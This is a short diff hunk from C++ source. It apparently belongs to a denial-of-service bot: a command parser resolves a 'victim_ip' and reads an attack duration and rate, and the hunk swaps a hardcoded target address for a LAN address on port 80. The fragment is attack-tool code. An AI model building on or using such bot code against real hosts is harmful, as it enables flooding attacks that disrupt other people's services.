@@ -193,7 +193,7 @@ void parseCommand(char command[])
 	        sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
 	        cout << victim_ip << endl;
 	        
-	        string ss="8.8.8.8";
+	        string ss="192.168.1.10";
 	        int port = 80;
 	        int attackDur = parseFourDigit(command+15+15+i*24);
             	int attackRate = parseFourDigit(command+15+15+4+i*24);
